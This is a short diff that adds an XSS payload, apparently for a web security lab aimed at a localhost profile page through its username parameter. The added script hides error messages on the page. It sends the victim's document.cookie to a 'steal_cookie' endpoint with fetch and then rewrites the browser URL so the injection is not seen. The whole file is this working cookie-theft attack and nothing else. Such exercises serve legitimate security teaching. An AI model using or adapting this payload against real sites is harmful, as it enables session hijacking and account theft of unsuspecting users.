@@ -1,0 +1,7 @@
+<!-- http://localhost:3000/profile?username=... -->
+
+<script>
+    Array.from(document.getElementsByClassName("error")).forEach(e => {e.hidden = true;});
+    fetch(`./steal_cookie?cookie=${document.cookie}`);
+    window.history.replaceState(null, "", "./profile");
+</script>
